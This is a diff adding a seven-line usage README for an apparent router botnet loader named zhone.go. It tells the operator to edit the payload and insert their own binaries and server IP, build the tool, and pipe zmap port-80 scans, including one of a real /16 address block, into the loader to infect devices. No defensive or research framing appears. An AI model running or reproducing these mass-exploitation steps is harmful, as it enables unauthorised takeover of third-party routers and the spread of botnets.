@@ -1,0 +1,7 @@
+change payload in zhone.go line 25 MAKE SURE YOU CHANGE YOUR BINS AND SERVER IP
+
+run:
+go build zhone.go
+zmap -p80 -w DRange.lst -q | ./zhone 80
+or
+zmap -p80 95.137.0.0/16 -q | ./zhone 80
